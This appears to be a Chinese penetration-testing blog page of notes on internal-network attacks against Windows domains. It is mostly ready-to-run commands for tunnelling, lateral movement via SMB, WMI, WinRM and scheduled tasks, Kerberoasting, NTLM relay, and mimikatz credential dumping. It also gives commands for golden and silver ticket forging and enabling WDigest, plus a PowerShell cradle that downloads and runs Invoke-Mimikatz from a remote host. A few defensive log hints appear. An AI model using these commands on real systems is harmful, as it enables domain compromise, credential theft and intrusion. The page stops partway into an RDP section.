<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="隧道搭建"><a href="#隧道搭建" class="headerlink" title="隧道搭建"></a>隧道搭建</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/269523.html">https://www.freebuf.com/articles/web/269523.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12498?time__1311=mqmhD5AKYKBKDKG=D/zTy8=8E54Qq+D&alichlgref=https://cn.bing.com/#toc-2">https://xz.aliyun.com/t/12498?time__1311&#x3D;mqmhD5AKYKBKDKG%3DD%2FzTy8%3D8E54Qq%2BD&amp;alichlgref&#x3D;https%3A%2F%2Fcn.bing.com%2F#toc-2</a></p>
</blockquote>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p><strong>frp、ew、ssh、Neo-reGeorg、netsh、Lcx</strong><br>网络层：Ipv6 情况、icmp 情况、Gre 隧道<br>传输层：Tcp 隧道、udp 隧道 常规端口转发<br>应用层：ssh 隧道、http 隧道、https 隧道、dns 隧道</p>
<h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>TCP&#x2F;UDP 协议：nc -zv  nc -zvu(u 为 udp)</p>
<p>HTTP 协议： curl wget</p>
<p>ICMP 协议： ping</p>
<p>DNS 协议： nslookup 或者 dig @ip</p>
<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><h3 id="ICMP-隧道"><a href="#ICMP-隧道" class="headerlink" title="ICMP 隧道"></a>ICMP 隧道</h3><p>Pingtunnel：将 tcp&#x2F;udp&#x2F;sock5 流量伪装为 icmp</p>
<p>服务器上开启服务</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo ./pingtunnel -<span class="hljs-keyword">type</span> <span class="hljs-type">server </span>-key [密钥,只限数字]<br></code></pre></td></tr></table></figure>

<p>客户端上连接服务器</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">pingtunnel<span class="hljs-selector-class">.exe</span> -type client -l :<span class="hljs-selector-attr">[转发本机2222端口作为ICMP隧道通讯端口]</span> -s <span class="hljs-selector-attr">[服务端IP]</span> -<span class="hljs-selector-attr">[转发类型]</span> <span class="hljs-number">1</span> -noprint <span class="hljs-number">1</span> -nolog <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ICMP转发为TCP<br>pingtunnel<span class="hljs-selector-class">.exe</span> -type client -l :<span class="hljs-number">4455</span> -s www<span class="hljs-selector-class">.yourserver</span><span class="hljs-selector-class">.com</span> -t www<span class="hljs-selector-class">.yourserver</span><span class="hljs-selector-class">.com</span>:<span class="hljs-number">4455</span> -tcp <span class="hljs-number">1</span><br>ICMP转发为UDP<br>pingtunnel<span class="hljs-selector-class">.exe</span> -type client -l :<span class="hljs-number">4455</span> -s www<span class="hljs-selector-class">.yourserver</span><span class="hljs-selector-class">.com</span> -t www<span class="hljs-selector-class">.yourserver</span><span class="hljs-selector-class">.com</span>:<span class="hljs-number">4455</span><br></code></pre></td></tr></table></figure>

<h3 id="DNS-隧道"><a href="#DNS-隧道" class="headerlink" title="DNS 隧道"></a>DNS 隧道</h3><p>dnscat2，原理：将数据通过 DNS 协议传输，需要一个独立的子域名通信，需要配置子域名后开放 udp，tcp53 端口，添加 A 记录和 NS 记录</p>
<h3 id="SSH-隧道"><a href="#SSH-隧道" class="headerlink" title="SSH 隧道"></a>SSH 隧道</h3><h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h4><p>1.修改攻击机和跳板机 ssh 配置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">攻击机<br>vi /etc/ssh/sshd_config<br>--GatewayPorts no改成<span class="hljs-built_in">yes</span>并且去掉注释<br>systemctl restart sshd.service<br>跳板机<br>AllowTcpForwarding <span class="hljs-built_in">yes</span>          <span class="hljs-comment"># 允许转发TCP协议</span><br>GatewayPorts <span class="hljs-built_in">yes</span>                <span class="hljs-comment"># 允许远程主机连接本地转发端口</span><br>PermitRootLogin <span class="hljs-built_in">yes</span>             <span class="hljs-comment"># 允许root登录</span><br>TCPKeepAlive <span class="hljs-built_in">yes</span>                <span class="hljs-comment"># 保持心跳，防止ssh断开</span><br>systemctl restart sshd.service<br></code></pre></td></tr></table></figure>

<ol start="2">
<li></li>
</ol>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">ssh -CfNg -L <span class="hljs-comment">[本机端口]</span>:<span class="hljs-comment">[隧道访问的内网主机]</span>:<span class="hljs-comment">[隧道访问的内网主机端口]</span> <span class="hljs-comment">[双网卡跳板机SSH连接命令]</span><br></code></pre></td></tr></table></figure>

<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/HGuhbdOYboOamKxD4rFcdGyPnEd.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<ol start="3">
<li></li>
</ol>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">检查跳板机端口工作状态<br>netstat -tulnp <span class="hljs-string">| grep 端口</span><br></code></pre></td></tr></table></figure>

<ol start="4">
<li></li>
</ol>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">本机连接跳板机端口（ssh填内网机器）<br>ssh -<span class="hljs-selector-tag">p</span> <span class="hljs-number">8888</span> root<span class="hljs-keyword">@127</span>.0.0.1<br></code></pre></td></tr></table></figure>

<h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">跳板机建立端口转发<br>ssh -R <span class="hljs-selector-attr">[远程主机端口]</span>: <span class="hljs-selector-attr">[目标主机]</span>: <span class="hljs-selector-attr">[目标主机端口]</span> <span class="hljs-selector-attr">[攻击者主机ssh]</span><br>攻击机直接连接内网<br>ssh -<span class="hljs-selector-tag">p</span> <span class="hljs-number">2222</span> root@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure>

<h4 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h4><h3 id="SOCKS-隧道"><a href="#SOCKS-隧道" class="headerlink" title="SOCKS 隧道"></a>SOCKS 隧道</h3><h3 id="HTTP-隧道"><a href="#HTTP-隧道" class="headerlink" title="HTTP 隧道"></a>HTTP 隧道</h3><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/YeGatZSjqfdZNUEuFIHkHg">【内网渗透】横向移动基础-远程执行 (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Cn0RcDgymcXpYsIacqJqmA">https://mp.weixin.qq.com/s/Cn0RcDgymcXpYsIacqJqmA</a></p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104900689.png" srcset="/img/loading.gif" lazyload alt="image-20240819104900689"></p>
<h2 id="端口分类"><a href="#端口分类" class="headerlink" title="端口分类"></a>端口分类</h2><p>135：rpc协议（远程过程调用）支持wmi（windwos管理接口）</p>
<p> <code>wmic /node:172.18.2.44 /user:&quot;user&quot; /password:&quot;pass&quot; process call create &quot;cmd.exe /c whoami“</code></p>
<p>日志少，配合wmihacker等工具</p>
<p>139&#x2F;445：SMB协议：开启ipc$共享</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">（基础连接）net use \\IP\ipc$ /u:<span class="hljs-string">&quot;username&quot;</span> password<br><br>（远程服务）sc \\172.18.2.44 create xxx binpath= “cmd.exe /c c:\1.bat” <br><br>（远程计划任务）: schtasks /create /tn <span class="hljs-built_in">test</span> /tr calc.exe /sc /s 192.168.120.150 /u administrator /p <span class="hljs-built_in">test</span> /ru system<br></code></pre></td></tr></table></figure>

<p>直接配合psexec，atexec，smbexec</p>
<p>atexec：明文密码或hash，计划任务</p>
<p>psexec：admin$共享，写文件执行服务</p>
<p>psexec.py: 同上 可交互</p>
<p>smbexec：明文密码或hash，服务</p>
<p>5985：WinRM（windwos远程管理）协议</p>
<p><code>winrs -r:172.18.2.44 -u:localhost\administrator -p:p@ssw0rd ipconfig</code></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14060?time__1311=GqAxuDRD0iq4lEzG7DyGQwfuC0Wx">内网横向下的135,445与5985端口利用 - 先知社区 (aliyun.com)</a></p>
<p>其中dcomexec, wmiexec，crackmapExec同时利用了135和445与admin$共享，他们通过smb回传结果</p>
<h2 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h2><p>利用 AS-REQ 包错误代码</p>
<p>kerbrute msf(kerberos_enumusers)</p>
<h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>获得密码后攻击不同用户</p>
<p>CrackMapExec kerbrute msf（smb_login）</p>
<p>防护：事件 ID 为 4768 且结果代码为 0x0 的审核成功的 Kerberos 身份验证服务事件日志</p>
<h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p>关闭 <strong>kerberos 预身份验证</strong>，</p>
<p>向域控 88 端口请求票据(<strong>GetNPUsers</strong> rubeus ASPERoast.ps1 Adfind)</p>
<p>本地离线爆破（john hashcat）</p>
<p>防护：</p>
<ul>
<li>取消勾选“不要求 kerberos 预身份认证”选项</li>
<li>重点关注事件 ID 为 4768 且预身份验证为 0 的日志</li>
</ul>
<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a><strong>Kerberoasting</strong></h2><p>获取 ST 后爆破 hash</p>
<p>普通默认机器可以注册 <strong>spn</strong>，但是普通域用户需要权限，攻击需要域内用户，所有用户都可以查询 spn</p>
<p>服务实例（SPN）会绑定用户，<strong>攻击者拿到服务实例NTLM hash加密的ST，然后ST爆破得到用户的密码</strong></p>
<p>1.获取 SPN(ServicePrincipal Names)服务主体名称（RiskySPN <strong>GetUserSPNs</strong> PowerView setspn）</p>
<p>2.请求服务票据(impacket.<strong>GetUserSPNs</strong>,<strong>Rubeus</strong>,POWERSHELL)</p>
<p>3.导出(cmd.Klist,kerbero,mimikatz,Empire)</p>
<p>4.破解(kerberoast hashcat)</p>
<p>防护：</p>
<ul>
<li>确保服务账户和密码为强密码</li>
<li>对域内服务账户权限进行限制</li>
<li>关注日志事件 ID 为 4769 的日志</li>
</ul>
<h2 id="委派-1"><a href="#委派-1" class="headerlink" title="委派"></a>委派</h2><p>主机用户：活动目录中的主机，也叫机器用户</p>
<p>服务账户：将服务运行起来并加入域时用到的账户，例如 mysql 账户</p>
<p>委派：将域内用户账户的权限给予服务账户</p>
<p>查询：Powershgell 脚本，Adfind，Ldapsearch</p>
<p>非约束委派：<strong>userAccountControl</strong>属性会包含<strong>TRUSTED_FOR_DELEGATION</strong></p>
<p>可以配合spooler漏洞，利用MS-RPRN强制运行域控通过kerberos去连接开启了非约束委派的机器</p>
<h2 id="NTLM-RELAY（嗅探）"><a href="#NTLM-RELAY（嗅探）" class="headerlink" title="NTLM RELAY（嗅探）"></a>NTLM RELAY（嗅探）</h2><p>responder 嗅探流量</p>
<p>受害机器查询不存在的主机名称后抓到 hash</p>
<p>配合 srf 文件</p>
<h4 id="打印机"><a href="#打印机" class="headerlink" title="打印机"></a>打印机</h4><p>域内任意用户访问目标机器的打印服务，printerbug.py 脚本会触发 SpoolService Bug，强制目标主机 AD 通过 MS-RPRNRPC 接口对攻击者进行 NTLM 身份认证。</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> printerbug.py xuan/hack:p<span class="hljs-variable">@ss1234</span>@<span class="hljs-number">10.10.10.10</span> <span class="hljs-number">10.10.10.5</span><br></code></pre></td></tr></table></figure>

<h4 id="petitPotam"><a href="#petitPotam" class="headerlink" title="petitPotam"></a>petitPotam</h4><h2 id="重放"><a href="#重放" class="headerlink" title="重放"></a>重放</h2><p>利用以上手段获取到 ntlm hash 后 暴力破解之外可以使用中继的方式共计其他服务</p>
<p>SMB</p>
<p>工作组：</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">python3</span> ntlmrelayx.py -t smb://<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.10</span> -smb3sup<span class="hljs-keyword">port</span> <span class="hljs-comment">--gpotato --gpotato-startup test.txt</span><br></code></pre></td></tr></table></figure>

<p>域环境：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">python3</span> smbrelayx.<span class="hljs-keyword">py</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span> -<span class="hljs-keyword">c</span> <span class="hljs-built_in">hostname</span><br><span class="hljs-keyword">python3</span>.<span class="hljs-number">11</span> ntlmrelayx.<span class="hljs-keyword">py</span> -t smb://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span> -<span class="hljs-keyword">c</span> <span class="hljs-built_in">hostname</span> -smb2support<br>sudo <span class="hljs-keyword">python3</span> MultiRelay.<span class="hljs-keyword">py</span> -t <span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span> -<span class="hljs-keyword">u</span> ALL<br></code></pre></td></tr></table></figure>

<p>还有 http ldap 等</p>
<h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>启动默认共享</p>
<p>用户账密</p>
<p>打开 445,139</p>
<h3 id="基础利用"><a href="#基础利用" class="headerlink" title="基础利用"></a>基础利用</h3><p>（查看目录和杀软）</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\目标IP\ipc$ <span class="hljs-string">&quot;密码&quot;</span> /user:用户名<br>查看：<span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span><br><span class="hljs-keyword">dir</span> \\目标ip\c$<br>tasklist /S ip /<span class="hljs-keyword">U</span> 用户 /P 密码<br></code></pre></td></tr></table></figure>

<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>at</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">查看时间 net time \\<span class="hljs-built_in">ip</span><br>复制恶意文件 copy 文件名 \\<span class="hljs-built_in">ip</span>\C$<br>创建计划任务 <span class="hljs-meta">at</span> \\ <span class="hljs-built_in">ip</span> 时间 路径<br>痕迹清理 <span class="hljs-meta">at</span> \\<span class="hljs-built_in">ip</span> 任务号 /delete<br></code></pre></td></tr></table></figure>

<p>Schtasks</p>
<p>创建计划任务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">创建 schtasks /create /s ip /tn 计划名/sc onstart /tr c:\dayu.txt /ru system /f<br>运行 schtasks /run /s ip /i /tn <span class="hljs-string">&quot;计划名&quot;</span><br>指定ipc账号 /u /p <br>删除 schtasks /delete /s ip /tn <span class="hljs-string">&quot;计划名&quot;</span> -f<br>痕迹清理 net use 名称 /del /y<br></code></pre></td></tr></table></figure>

<h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>windows servers 2012 R2之后，系统默认安装KB2871997,本地管理员组中只有administrator可以传递（FilterAdministratorToken注册表为0）</p>
<p>hash 传递到其他机子上，通过 445（SMB 文件共享端口）和 135 端口(RPC 服务共享)横向</p>
<p>CrackMapExec,MSF(SMB&#x2F;PSEXEC),impacket-smbexec</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">目标机器上：sekurlsa:<span class="hljs-function">:pth</span> <span class="hljs-string">/user</span><span class="hljs-function">:administrator</span> <span class="hljs-string">/domain</span>:<span class="hljs-string">&quot;xxx.com&quot;</span> <span class="hljs-string">/ntlm</span><span class="hljs-function">:6542d35ed5ff6ae5e75b875068c5d3bc</span>  <span class="hljs-string">//</span>自行修改<br>net use \\ip\c$<br></code></pre></td></tr></table></figure>

<h4 id="获取-hash"><a href="#获取-hash" class="headerlink" title="获取 hash"></a>获取 hash</h4><p>Mimikatz, msf(hashdump | windows&#x2F;gather&#x2F;smart_hashdump) cs sam 表</p>
<p>prodump (微软自带，抓取 lsass 后本地处理)</p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/GW14bMYCLoLO8Ox8ncVci65Unwh.png" srcset="/img/loading.gif" lazyload alt="截图">通过 SAM 和 System</p>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nsis">手动<br>reg save <span class="hljs-params">hklm</span>\sam sam.hive<br>reg save <span class="hljs-params">hklm</span>\<span class="hljs-params">system</span> <span class="hljs-params">system</span>.hive<br><span class="hljs-title function_">lsadump::sam</span> /sam:sam.hive /<span class="hljs-params">system</span>:<span class="hljs-params">system</span>.hive    <span class="hljs-comment">#文件和mimikatz放在同一目录</span><br></code></pre></td></tr></table></figure>

<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nsis">①<br>mimikatz<br><span class="hljs-title function_">privilege::debug</span>    <span class="hljs-comment">#提升权限</span><br><span class="hljs-title function_">token::elevate</span>    <span class="hljs-comment">#system权限</span><br><span class="hljs-title function_">lsadump::sam</span>    <span class="hljs-comment">#读取本地SAM文件，获取NTML Hash</span><br>②<br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;log&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span>    <span class="hljs-comment">#在线读取散列值及明文密码</span><br><br>利用密码增添用户<br><span class="hljs-title function_">privilege::debug</span><br><span class="hljs-title function_">sekurlsa::pth</span> /<span class="hljs-literal">user</span>:administrator /domain:workgroup <br>/ntlm:<span class="hljs-number">6</span>c5fbeb7c83cf7afe04f8d7e38852d52<br></code></pre></td></tr></table></figure>

<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">kali开启http<br>Python <span class="hljs-literal">-m</span> SimpleHTTPServer <span class="hljs-number">80</span><br>远程调用<br>powershell <span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;ip/Invoke-Mimikatz.ps1&#x27;</span>);<span class="hljs-built_in">Invoke-Mimikatz</span><br></code></pre></td></tr></table></figure>

<h3 id="lsass-dmp"><a href="#lsass-dmp" class="headerlink" title="lsass.dmp"></a>lsass.dmp</h3><p>导出：</p>
<p>任务管理器</p>
<p>procdump</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br></code></pre></td></tr></table></figure>

<p>mimikatz</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">sekurlsa:</span>:minidump lsass.DMP    <span class="hljs-meta">#看到Switch to MINIDUMP 加载成功</span><br><span class="hljs-symbol">sekurlsa:</span>:logonPasswords full    <span class="hljs-meta">#导出密码散列值</span><br></code></pre></td></tr></table></figure>

<h4 id="Wdigest-明文抓取"><a href="#Wdigest-明文抓取" class="headerlink" title="Wdigest 明文抓取"></a>Wdigest 明文抓取</h4><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/BhYsbhulCo6zlGx43RLcxLgonKh.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment">#开启</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="hljs-comment">#关闭</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></code></pre></td></tr></table></figure>

<p>调整为 1 后重启即可查看明文密码（权限维持可用）</p>
<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<p>在 Kerberos 认证中，Client 通过 AS（身份认证服务）认证后，AS 会给 Client 一个 Logon Session Key 和 TGT，而 Logon Session Key 并不会保存在 KDC 中，krbtgt 的 NTLM Hash 又是固定的，所以只要得到 krbtgt 的 NTLM Hash，就可以伪造 TGT 和 Logon Session Key 来进入下一步 Client 与 TGS 的交互。而已有了金票后，就跳过 AS 验证，不用验证账户和密码，所以也不担心域管密码修改。</p>
</blockquote>
<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><blockquote>
<p>需要伪造的域管理员用户名<br>完整的域名<br>域 SID<br>krbtgt 的 NTLM Hash</p>
</blockquote>
<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">一.<br>klist purge    <span class="hljs-comment">#windows命令行下清除票据</span><br>net config workstation   <span class="hljs-comment">#获取登录域</span><br>nltest /dsgetdc:域名  <span class="hljs-comment">#获取主机</span><br></code></pre></td></tr></table></figure>

<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">二.抓NTLM <span class="hljs-built_in">Hash</span><br>mimikatz.exe<br>privilege::debug<br>lsadump::dcsync /<span class="hljs-built_in">domain</span>:工作域 /<span class="hljs-built_in">all</span> /csv<br></code></pre></td></tr></table></figure>

<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">三.查看krbtgt用户的SID<br>法<span class="hljs-number">1</span> lsadump::dcsync /<span class="hljs-keyword">domain</span>:工作域 /<span class="hljs-keyword">user</span>:krbtgt<br>法<span class="hljs-number">2</span> wmic useraccount <span class="hljs-keyword">get</span> <span class="hljs-type">name</span>,sid<br></code></pre></td></tr></table></figure>

<h3 id="生成票据"><a href="#生成票据" class="headerlink" title="生成票据"></a>生成票据</h3><p>mimikatz.exe “kerberos::golden &#x2F;admin:systest &#x2F;domain:xiyou.dayu.com &#x2F;sid:S-1-5-21-1816246241-4074331134-2257350442 &#x2F;krbtgt:39601ebdad1d3e960ed3712398d3ab3a &#x2F;ticket:ticket.kirbi” exit</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/admin</span>：伪造的用户名（任意）<br><span class="hljs-string">/domain</span>：域名称<br><span class="hljs-string">/sid</span>：SID值，注意是去掉最后一个-后面的值<br><span class="hljs-string">/krbtgt</span>：krbtgt的HASH值<br><span class="hljs-string">/ticket</span>：生成的票据名称    <span class="hljs-string">//</span>不是写入内存中的命令<br></code></pre></td></tr></table></figure>

<p>注入</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::purge<br>kerberos::ptt 票据名<br></code></pre></td></tr></table></figure>

<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<p>在 Kerberos 认证的第三步，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后,通过自己的 Master Key 解密 ST，从而获得 Session Key。通过 Session Key 解密 Authenticator3，进而验证对方的身份，验证成功就让 Client 访问 server 上的指定服务了。 —&gt; 通过 Server 用户 Hash 伪造一个 ST</p>
</blockquote>
<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><blockquote>
<p>域名<br>域 SID(test)<br>目标服务器的 FQDN<br>可利用的服务<br>服务账号的 NTLM Hash<br>要伪造的用户名</p>
</blockquote>
<h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net config workstation 获取工作域<br>nltest /dsgetdc:域名  获取主机名<br>Whoami /<span class="hljs-built_in">all</span>  SID<br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>&gt;<span class="hljs-built_in">log</span>.txt 获取NTML <span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure>

<p>生成票据<br>kerberos::golden &#x2F;domain:xiyou.dayu.com &#x2F;sid:S-1-5-21-1816246241-4074331134-2257350442 &#x2F;target:xiyou.xiyou.dayu.com &#x2F;service:cifs &#x2F;rc4:f5369b5accc878d9eedfcde13578e2fc &#x2F;user:testw &#x2F;ptt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/domain：域名<br>/sid：域的SID值<br>/target: 域控制器全称即FQDN<br>/service: 需要指定相关的服务名，此处为cifs<br>/rc4: 域控的计算机账户ntlm <span class="hljs-built_in">hash</span><br>/user: 要伪造的用户名，任意填写<br></code></pre></td></tr></table></figure>

<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/PdHnbjpPXoIfJDxA4cqc5Gc2nig.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p>由于白银票据不与KDC交互，并不要求dns远程解析，socks环境下黄金票据无法远程dns解析会导致NTLM认证失败</p>
<h2 id="RDP-协议"><a href="#RDP-协议" class="headerlink" title="RDP 协议"></a>RDP 协议</h2><p>① 查询注册表确定是否主机开启了远程桌面</p>
